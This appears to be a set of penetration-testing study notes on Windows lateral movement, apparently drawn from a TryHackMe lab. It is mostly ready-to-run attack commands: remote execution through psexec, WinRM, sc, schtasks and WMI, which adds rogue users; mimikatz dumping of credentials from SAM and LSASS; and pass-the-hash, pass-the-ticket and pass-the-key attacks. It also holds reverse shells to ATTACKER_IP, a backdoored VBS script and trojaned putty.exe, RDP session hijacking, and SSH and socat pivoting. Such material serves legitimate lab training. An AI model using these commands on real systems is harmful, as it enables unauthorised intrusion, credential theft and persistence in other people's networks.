## Spawn process remotely

- `psexec` : 
	- ports: 445/TCP, SMB
	- _Administrator_ group membership required
	- part of MS [sysinternal tools](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```powershell
# psexec64.exe \\MACHINE_IP -u <admin user> -p <admin password> -i <command to run>
psexec64.exe \\MACHINE_IP -u Administrator -p password -i cmd.exe
```

- Remote Process Creation Using `WinRM`
	- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	-  _Remote Management Users_ group membership required
```powershell
winrs.exe -u:Administrator -p:password -r:target cmd

# or

$username = 'Administrator';
$password = 'password';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 

# Need to create a PSCredential object
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

# Use above credential to enter the PS session
Enter-PSSession -Computername TARGET -Credential $credential

# Or use invoke command to run ScriptBlocks remotely via WinRM
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}

```

- Creating Services Using `sc`
	- Ports:
	    - 135/TCP, 49152-65535/TCP (DCE/RPC)
	    - 445/TCP (RPC over SMB Named Pipes)
	    - 139/TCP (RPC over SMB Named Pipes)
	- _Administrator_ group membership required
	- `sc` will execute command even if it fails after running it
```powershell

sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice

# Stop and delete
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

- Creating Scheduled Tasks Remotely
```powershell
# Create a new scheduled task
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the scheduled task
schtasks /s TARGET /run /TN "THMtask1" 

# Delete the task
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### Useful commands

```sh
# Generate rev shell payload
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

# upload payload 'myservice.exe' using smbclient
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' <password>

# Listen for incoming connection
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"

# Use runas to activate the another rev shell on target machine
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

# Above connection can be received as below
nc -lvp 4443

# In the above shell, create and start the service using uploaded payload
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto 
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

## Moving Laterally using WMI

### Connecting to WMI From Powershell

- create a PSCredential object

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

- establish a WMI session using either of the following protocols:
	- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
	- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Remote Process Creation Using WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
- _Administrator_ group membership required

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ 
	CommandLine = $Command 
}
```

```sh
# command for MS cmd.exe
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

### Creating Services Remotely with WMI

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

- Get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

- Once done, stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Creating Scheduled Tasks Remotely with WMI

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

  
### Installing MSI packages through WMI

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```



## Other Authentication material
- Using any windows account without knowing the password
- Credentials can be extracted using `mimikatz`

### pass-the-hash (PtH)
- Extracting NTLM hashes from local SAM. Only for local user
```mimikatz
mimikatz # privilege::debug 
mimikatz # token::elevate 
mimikatz # lsadump::sam 
# RID : 000001f4 (500) 
# User : Administrator
#  Hash NTLM: 145e02c50333951f71d13c245d352b50
```
- Extracting NTLM hashes from LSASS memory: for local as well as domain user
```mimikatz

mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
# Authentication Id : 0 ; 308124 (00000000:0004b39c)
# Session           : RemoteInteractive from 2 
# User Name         : bob.jenkins
# Domain            : ZA
# Logon Server      : THMDC
# Logon Time        : 2022/04/22 09:55:02
# SID               : S-1-5-21-3330634377-1326264276-632209373-4605
#        msv :
#         [00000003] Primary
#         * Username : bob.jenkins
#         * Domain   : ZA
#         * NTLM     : 6b4a57f67805a663c818106dc0648484

```

- use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```mimikatz
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

- Receive above reverse shell: `nc -lvp 5555`
- In Linux:
```shell
# Connect to RDP using PtH
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

# Connect via psexec using PtH:
# Note: Only the linux version of psexec support PtH.
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP


# Connect to WinRM using PtH:
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### pass-the-ticket 
- extract Kerberos tickets and session keys from LSASS memory using mimikatz
- requires SYSTEM privileges
```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
-  Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).
-  inject the extracted tickets into the current session with the following command:

```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
- Use `klist` command to check if the tickets were correctly injected

### Overpass-the-hash / Pass-the-Key
- timestamp sent to request a TGT is encrypted with an encryption key derived from the password. The algorithm to derive this key can be either DES, RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.
- obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

- If we have the RC4 hash, run:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

- If we have the AES128 hash, run:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

- If we have the AES256 hash, run:

```mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
- Receive the shell: `nc -lvp 5556`
- Use `winrs.exe` to connect: `winrs.exe -r:THMIIS.za.tryhackme.com cmd`

## Abusing User Behavior
- Abusing writable shares: finding a shortcut to a script or executable file hosted on a network share
- Backdooring .vbs Scripts: we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```vbs
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```
  
  - Backdooring .exe Files To create a backdoored putty.exe, we can use the following command:

```sh
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

- RDP hijacking: When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:

![Run as administrator](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png)  

From there, run `PsExec64.exe`:

```shell-session
PsExec64.exe -s cmd.exe
```

To list the existing sessions on a server, you can use the following command:

Command Prompt

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a **Disc** state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.

To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:

```cmd
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

As a result, we'll resume luke's RDP session and connect to it immediately. 


## Port Forwarding

- M1: Attacker ip: `1.1.1.1`
- M2: ip of compromised machine: `2.2.2.2`
- M3: Target ip: `3.3.3.3`
- Create dummy user
```sh
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
### SSH remote port forwarding
- Connect a port from M1 to M3 via M2
- Run on M2: `ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N`
- After the tunnel is successful, this command will connect M1 to M3: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

### SSH local port forwarding
- To forward port 80 from the M1 and make it available from M2, run on M1:
```sh
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```
- It will open port 80 on M2 and forward the request on M1 on 80
- Allow port 80 in firewall:
```powershell
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
- After this, any user pointing their browsers to M1 at `http://2.2.2.2:80` and see the website published by the attacker's machine.
### Using Socat
- It connects two sockets: `socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321`
- Eg. Run on M2 `socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389`
- Eg. for rev connection, run on M2: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80` 

### Dynamic Port forwarding
- Connect to port dynamically:
- Run on M2: `ssh tunneluser@1.1.1.1 -R 9050 -N`
- On M1, setup proxychains to use M2 as a proxy, edit `/etc/proxychains.conf`
```sh
[ProxyList]
socks4  127.0.0.1 9050
```

- Use proxychains to run any command via M2: `proxychains curl http://pxeboot.za.tryhackme.com`
### Complex tunneling
```sh
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```
